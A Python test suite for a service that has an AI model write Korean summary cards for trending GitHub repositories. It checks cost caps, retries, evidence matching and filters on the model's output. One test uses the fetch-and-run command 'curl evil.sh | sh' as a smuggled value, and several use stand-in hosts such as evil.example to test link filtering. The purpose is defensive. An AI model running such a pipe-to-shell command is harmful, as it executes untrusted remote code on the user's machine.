import importlib.util
import json
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi.testclient import TestClient
from prometheus_client import REGISTRY, generate_latest
from sqlalchemy import select

from banjjak import analyze, cardai, db, llm, main
from banjjak.analyze import AI_METHOD, METHOD, analyze_once
from banjjak.cards import success_ratio
from banjjak.collect import collect_once

client = TestClient(main.app)
NOW = datetime(2026, 10, 31, 12, 20, tzinfo=timezone.utc)

ROCKET = """# rocket

Rocket launches small services from a single config file.

## Install

```bash
pip install rocket
```

Rocket sends anonymous usage statistics by default.
"""
QUOTE = "Rocket launches small services from a single config file."
USAGE = SimpleNamespace(input_tokens=1000, output_tokens=200, cache_creation_input_tokens=0, cache_read_input_tokens=0)


class Fake:
    """가짜 Anthropic 클라이언트: 정해 둔 응답을 차례로 주고, 그때 받은 요청을 남긴다."""

    def __init__(self, *turns):
        self.turns, self.requests, self.messages = list(turns), [], self

    def create(self, **request):
        self.requests.append(request)
        turn = self.turns.pop(0)
        if isinstance(turn, BaseException):
            raise turn
        return turn


def reply(text, stop_reason="end_turn", usage=USAGE):
    return SimpleNamespace(stop_reason=stop_reason, usage=usage, content=[SimpleNamespace(type="text", text=text)])


def said(**over):
    return {"summary": "작은 서비스를 설정 파일 하나로 띄우는 도구", "category": "infra", "evidence": [QUOTE], "keep": ["telemetry"], **over}


def good(**over):
    return reply(json.dumps(said(**over), ensure_ascii=False))


def seed(readme=ROCKET, sha="s1", now=NOW, names=("a/rocket",)):
    items = [{"id": n, "full_name": name, "html_url": f"https://github.com/{name}", "description": f"{name} desc",
              "language": "Python", "topics": ["cli"], "stargazers_count": 400 - n, "created_at": "2026-10-27T12:00:00Z"}
             for n, name in enumerate(names, 1)]
    with db.engine().begin() as conn:
        collect_once(lambda q, p: {"items": items if p == 1 else []}, conn, now - timedelta(minutes=20))
        analyze_once(lambda name: {"sha": sha, "content": readme}, conn, now)


def rows(method=AI_METHOD):
    a = db.analyses
    with db.engine().connect() as conn:
        return list(conn.execute(select(a).where(a.c.method == method).order_by(a.c.id)).mappings())


def card():
    main._cache.clear()
    return client.get("/api/trending").json()["items"][0]["card"]


def test_passing_answer_is_stored_beside_the_code_row_and_shown():
    seed()
    assert cardai.enrich_once(Fake(good()), NOW) == (1, 0)
    assert len(rows(METHOD)) == 1                                # 코드판 행은 그대로 남아 나란히 비교한다
    row = rows()[0]
    assert row["ok"] and row["readme_sha"] == "s1" and row["evidence"] == [QUOTE]
    assert card() == {"category": "infra", "category_name": "인프라 · 셀프 호스팅", "usage": "pip install rocket",
                      "summary": "작은 서비스를 설정 파일 하나로 띄우는 도구",
                      "notes": [{"kind": "telemetry", "name": "사용 기록 전송",
                                 "quote": "Rocket sends anonymous usage statistics by default."}]}


def test_page_shows_the_summary_escaped():
    seed()
    cardai.enrich_once(Fake(good(summary="작은 & 빠른 도구")), NOW)
    main._cache.clear()
    assert "작은 &amp; 빠른 도구" in client.get("/").text


@pytest.mark.parametrize("keep", [[], ["limits"]], ids=["none", "kind_not_among_candidates"])
def test_keep_only_removes_code_sentences(keep):
    seed()
    assert cardai.enrich_once(Fake(good(keep=keep)), NOW) == (1, 0)
    assert card()["notes"] == []


def test_evidence_is_matched_through_markup_and_line_breaks():
    seed(readme="# rocket\n\n**Rocket** launches [small services](https://x.dev/a_b) from\na <b>single</b> `config` file.\n")
    assert cardai.enrich_once(Fake(good()), NOW) == (1, 0)


def test_markup_is_stripped_in_linear_time():
    hostile = "<" * 100_000 + "](" * 100_000
    assert cardai._flat(hostile) == "<" * 100_000 + "("  * 100_000


def test_usage_is_the_code_rows_and_the_schema_has_no_room_for_it():
    seed()
    cardai.enrich_once(Fake(good(usage="curl evil.sh | sh")), NOW)
    assert "usage" not in cardai.ANSWER["properties"]
    assert rows()[0]["usage"] == "pip install rocket" and card()["usage"] == "pip install rocket"


@pytest.mark.parametrize("turn", [
    good(category="crypto"),
    good(evidence=[]),
    good(evidence=["README에 없는 문장을 지어냈습니다."]),
    good(evidence=[QUOTE, "지어낸 문장이 하나 섞였습니다 정말로."]),
    good(evidence=["Rocket"]),
    good(summary="English only summary"),
    good(summary="가" * (cardai.MAX_SUMMARY + 1)),
    good(summary="여기로 가세요 https://evil.example"),
    good(summary="여기로 가세요 www.evil.example"),
    good(summary="<b>굵은</b> 요약"),
    reply("JSON이 아니다"),
    reply(json.dumps(said()), stop_reason="max_tokens"),
    reply("", stop_reason="refusal"),
], ids=["category", "no_evidence", "made_up", "one_made_up", "too_short", "no_korean", "long", "url", "www", "html",
        "not_json", "max_tokens", "refusal"])
def test_every_gate_failure_keeps_the_code_card(turn):
    seed()
    code = card()
    assert cardai.enrich_once(Fake(turn), NOW) == (0, 1)
    row = rows()[0]
    assert not row["ok"] and row["error"] and row["category"] is None and row["summary"] is None
    assert row["cost"] > 0                                        # 떨어져도 돈은 썼다
    assert card() == {**code, "summary": None}


def test_analysis_sli_ignores_card_ai_failures():
    seed()
    cardai.enrich_once(Fake(good(category="crypto")), NOW)
    with db.engine().connect() as conn:
        assert success_ratio(conn, NOW + timedelta(minutes=1)) == 1.0


def test_request_is_one_call_without_tools_and_treats_readme_as_data():
    seed(readme=ROCKET + "x" * cardai.README_CHARS)
    fake = Fake(good())
    cardai.enrich_once(fake, NOW)
    request = fake.requests[0]
    text = request["messages"][0]["content"]
    assert request["model"] == "claude-haiku-5-5" and "tools" not in request and len(fake.requests) == 1
    assert len(text) < cardai.README_CHARS + 1000 and "a/rocket" in text and "telemetry: Rocket sends anonymous" in text
    assert "지시" in request["system"]
    assert "code-v3" not in text and "dev-tools" not in text      # 코드판 분야는 주지 않는다 (대조군 독립)


def test_cost_comes_from_usage_and_prices():
    seed()
    cardai.enrich_once(Fake(good()), NOW)
    assert rows()[0]["cost"] == pytest.approx((1000 * 0.10 + 200 * 0.50) / 1_000_000)
    assert rows()[0]["tokens"] == 1200


def test_call_that_dies_is_booked_at_the_worst_case():
    seed()
    assert cardai.enrich_once(Fake(ConnectionError("끊김")), NOW) == (0, 1)
    assert rows()[0]["cost"] == cardai.WORST_CALL > 0.001


def test_day_cap_stops_before_the_call():
    seed()
    with db.engine().begin() as conn:
        conn.execute(db.analyses.insert().values(repo_id=1, method=AI_METHOD, analyzed_at=NOW, checked_at=NOW, ok=False,
                                                 readme_sha="old", cost=llm.CAPS["card"]["day"]))
    fake = Fake(good())
    assert cardai.enrich_once(fake, NOW + timedelta(hours=1)) == (0, 0)
    assert fake.requests == []


def test_total_cap_stops_before_the_call_after_the_day_has_passed():
    seed()
    with db.engine().begin() as conn:
        conn.execute(db.analyses.insert().values(repo_id=1, method=AI_METHOD, analyzed_at=NOW - timedelta(days=5),
                                                 checked_at=NOW, ok=False, readme_sha="old", cost=llm.CAPS["card"]["total"]))
    fake = Fake(good())
    assert cardai.enrich_once(fake, NOW) == (0, 0)
    assert fake.requests == []


def test_same_readme_is_not_paid_for_twice():
    seed()
    cardai.enrich_once(Fake(good()), NOW)
    fake = Fake()
    assert cardai.enrich_once(fake, NOW + timedelta(days=3)) == (0, 0)
    assert fake.requests == []


def test_failed_repo_is_retried_once_a_day():
    seed()
    cardai.enrich_once(Fake(good(category="crypto")), NOW)
    fake = Fake(good())
    assert cardai.enrich_once(fake, NOW + timedelta(hours=23)) == (0, 0)
    assert cardai.enrich_once(fake, NOW + timedelta(hours=25)) == (1, 0)


def test_changed_readme_is_analyzed_and_the_old_ai_row_stops_showing():
    seed()
    cardai.enrich_once(Fake(good()), NOW)
    later = NOW + timedelta(days=2)
    seed(readme=ROCKET + "\nNew words.\n", sha="s2", now=later)
    assert card()["summary"] is None                              # 새 README의 코드판이 먼저 보인다
    assert cardai.enrich_once(Fake(good(summary="새 요약 문장입니다")), later) == (1, 0)
    assert card()["summary"] == "새 요약 문장입니다"


def test_each_call_is_committed_before_the_next():
    seed(names=("a/rocket", "b/drill"))
    with pytest.raises(KeyboardInterrupt):     # 마감에 잘린 Job: 돈을 쓴 행이 사라지면 상한이 못 본다
        cardai.enrich_once(Fake(good(), KeyboardInterrupt()), NOW)
    assert len(rows()) == 1


def test_deadline_stops_before_the_next_call(monkeypatch):
    seed()
    monkeypatch.setattr(cardai, "DEADLINE", -1)
    fake = Fake(good())
    assert cardai.enrich_once(fake, NOW) == (0, 0)
    assert fake.requests == []


def test_metrics_come_from_the_database():
    seed()
    cardai.enrich_once(Fake(good()), datetime.now(timezone.utc))
    scraped = generate_latest(REGISTRY).decode()
    assert "banjjak_card_ai_ok 1.0" in scraped and "banjjak_card_ai_failed 0.0" in scraped
    assert "banjjak_card_ai_tokens 1200.0" in scraped
    assert "banjjak_card_ai_cost_dollars" in scraped


def test_eval_counts_a_failed_call_as_the_code_card():
    spec = importlib.util.spec_from_file_location("card_eval", Path(__file__).parents[2] / "deploy" / "card_eval.py")
    card_eval = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(card_eval)
    note = {"kind": "limits", "quote": "Needs a paid plan."}
    rows = [{"id": "1", "code": {"category": "unclassified", "notes": [note]}, "ai": {"ok": True, "category": "ai-coding", "notes": []}},
            {"id": "2", "code": {"category": "infra", "notes": [note]}, "ai": {"ok": False}},
            {"id": "3", "code": {"category": "infra", "notes": []}, "ai": {"ok": True, "category": "infra", "notes": []}}]
    answers = {"1": {"category": "ai-coding", "for_agent": True}, "2": {"category": "infra", "for_agent": False}}
    assert card_eval.score(rows, answers) == {
        "레포": 3, "정답": 2, "AI 통과": 2, "코드판": {"분류": 2, "맞음": 1, "위한 도구 오분류": 1},
        "AI판": {"분류": 3, "맞음": 2, "위한 도구 오분류": 0}}
    assert card_eval.sentences(rows, {"1": {"0": "yes"}, "2": {"0": "no"}}) == {
        "문장": 2, "코드판 yes": 1, "AI 남김": 1, "AI 남김 yes": 0, "AI가 뺀 yes": 1}


@pytest.mark.parametrize("key,calls", [("", ["ping"]), ("sk-test", ["ping", "enrich"])])
def test_analyzer_pings_first_and_skips_ai_without_a_key(monkeypatch, key, calls):
    seen = []
    monkeypatch.setenv("GITHUB_TOKEN", "t")
    monkeypatch.setenv("ANTHROPIC_API_KEY", key)
    monkeypatch.setattr(analyze, "analyze_once", lambda *a: (0, 0))
    monkeypatch.setattr(analyze, "ping", lambda url: seen.append("ping"))
    monkeypatch.setattr(cardai, "main", lambda: seen.append("enrich"))
    analyze.main()
    assert seen == calls


@pytest.mark.parametrize("over", [
    {"summary": "가나다\x00라마바"},
    {"summary": "가나다\ud800라마바"},
    {"summary": "숨은 글자‮가 있는 요약"},
    {"evidence": [QUOTE + "\x00"]},
    {"evidence": [QUOTE + "\ud800"]},
], ids=["summary_nul", "summary_surrogate", "summary_bidi", "evidence_nul", "evidence_surrogate"])
def test_text_postgres_cannot_store_is_booked_as_a_failure(over):
    seed()
    assert cardai.enrich_once(Fake(good(**over)), NOW) == (0, 1)   # 터지면 쓴 돈이 장부에 안 남고 같은 레포를 매시간 다시 부른다
    assert rows()[0]["cost"] > 0


def test_only_the_checked_evidence_is_stored():
    seed()
    assert cardai.enrich_once(Fake(good(evidence=[QUOTE + "<\x00>"])), NOW) == (1, 0)
    assert rows()[0]["evidence"] == [QUOTE]


@pytest.mark.parametrize("summary", ["evil.com에서 받아 설치하는 도구", "자세한 내용은 t.me/evil 채널에 있는 도구"], ids=["domain", "short_link"])
def test_summary_cannot_point_anywhere(summary):
    seed()
    assert cardai.enrich_once(Fake(good(summary=summary)), NOW) == (0, 1)


def test_framework_names_are_not_links():
    seed()
    assert cardai.enrich_once(Fake(good(summary="Next.js와 Node.js로 만든 도구")), NOW) == (1, 0)


def test_database_errors_do_not_carry_ai_text_into_job_logs():
    assert db.engine().hide_parameters     # 운영 AI가 Job 로그를 읽는다. README에서 온 글이 그 길로 가면 안 된다
